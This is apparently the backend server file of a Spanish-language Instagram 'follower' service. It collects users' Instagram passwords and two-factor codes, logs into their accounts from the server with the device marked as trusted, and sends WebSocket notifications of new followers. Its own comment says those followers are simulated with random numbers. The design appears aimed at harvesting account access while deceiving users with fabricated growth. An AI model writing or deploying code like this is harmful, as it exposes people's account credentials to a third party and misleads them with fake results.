// server.js
const express = require('express');
const WebSocket = require('ws');
const { IgApiClient } = require('instagram-private-api');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuración de Express
app.use(express.static('public'));
app.use(express.json());

// Ruta para la verificación de Instagram
app.post('/api/verify', async (req, res) => {
    const { username, password, code } = req.body;
    
    try {
        const ig = new IgApiClient();
        ig.state.generateDevice(username);
        
        // Autenticación
        await ig.account.login(username, password);
        
        // Si hay código de 2FA
        if (code) {
            await ig.account.twoFactorLogin({ 
                username,
                verificationCode: code,
                trustThisDevice: '1',
                verificationMethod: '1'
            });
        }
        
        // Obtener información del usuario
        const user = await ig.account.currentUser();
        
        res.json({
            success: true,
            user: {
                username: user.username,
                fullName: user.full_name,
                profilePic: user.profile_pic_url,
                followers: user.follower_count,
                following: user.following_count
            }
        });
    } catch (error) {
        console.error('Error verifying Instagram account:', error);
        res.status(400).json({
            success: false,
            message: error.message
        });
    }
});

// Iniciar servidor HTTP
const server = app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

// Configurar WebSocket
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
    console.log('New client connected');
    
    // Enviar actualizaciones periódicas de seguidores
    const interval = setInterval(() => {
        // Simular nuevos seguidores
        const newFollowers = Math.floor(Math.random() * 5);
        if (newFollowers > 0) {
            ws.send(JSON.stringify({
                type: 'new_followers',
                count: newFollowers,
                message: `¡Tienes ${newFollowers} nuevos seguidores!`
            }));
        }
    }, 30000);
    
    ws.on('close', () => {
        console.log('Client disconnected');
        clearInterval(interval);
    });
    
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });
});
